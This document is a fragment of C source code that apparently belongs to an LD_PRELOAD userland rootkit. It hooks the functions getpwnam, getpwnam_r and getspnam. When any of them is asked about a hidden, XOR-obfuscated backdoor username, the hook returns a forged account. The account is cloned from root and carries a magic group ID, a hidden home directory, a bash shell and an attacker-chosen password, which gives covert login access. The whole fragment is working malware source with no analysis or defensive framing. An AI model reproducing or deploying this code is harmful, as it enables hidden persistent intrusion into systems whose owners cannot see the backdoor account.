struct passwd *getpwnam(const char *name)
{
    HOOK(o_getpwnam, CGETPWNAM);

    char *bduname=strdup(BD_UNAME); xor(bduname);
    if(!strcmp(name, bduname))
    {
        struct passwd *bpw;
        bpw = o_getpwnam("root");
        bpw->pw_name = strdup(bduname);
        bpw->pw_uid = MGID;
        bpw->pw_gid = MGID;

        char home[256];
        char *idir=strdup(IDIR); xor(idir);
        snprintf(home, sizeof(home), "%s", idir);
        CLEAN(idir);

        bpw->pw_dir = strdup(home);
        bpw->pw_shell = "/bin/bash";

        CLEAN(bduname);
        return bpw;
    }
    CLEAN(bduname);
    return o_getpwnam(name);
}

int getpwnam_r(const char *name, struct passwd *pwd, char *buf, size_t buflen, struct passwd **result)
{
    HOOK(o_getpwnam_r, CGETPWNAM_R);

    char *bduname=strdup(BD_UNAME); xor(bduname);
    if(!strcmp(name, bduname))
    {
        o_getpwnam_r("root", pwd, buf, buflen, result);
        pwd->pw_name = strdup(bduname);
        pwd->pw_uid = MGID;
        pwd->pw_gid = MGID;

        char home[256];
        char *idir=strdup(IDIR); xor(idir);
        snprintf(home, sizeof(home), "%s", idir);
        CLEAN(idir);

        pwd->pw_dir = strdup(home);
        pwd->pw_shell = "/bin/bash";

        CLEAN(bduname);
        return 0;
    }
    CLEAN(bduname);
    return o_getpwnam_r(name, pwd, buf, buflen, result);
}

struct spwd *getspnam(const char *name)
{
    HOOK(o_getspnam, CGETSPNAM);
    char *bduname=strdup(BD_UNAME); xor(bduname);
    if(!strcmp(name, bduname))
    {
        struct spwd *bspwd = malloc(sizeof(struct spwd));
        char *bdpwd = strdup(BD_PWD); xor(bdpwd);

        bspwd->sp_namp=strdup(bduname);
        bspwd->sp_pwdp=strdup(bdpwd);
        bspwd->sp_lstchg=time(NULL)/(60*60*24);
        bspwd->sp_expire=time(NULL)/(60*60*24)+90;
        bspwd->sp_inact=9001;
        bspwd->sp_warn=0;
        bspwd->sp_min=0;
        bspwd->sp_max=99999;

        CLEAN(bduname); CLEAN(bdpwd);
        return bspwd;

    }
    CLEAN(bduname);
    return o_getspnam(name);
}
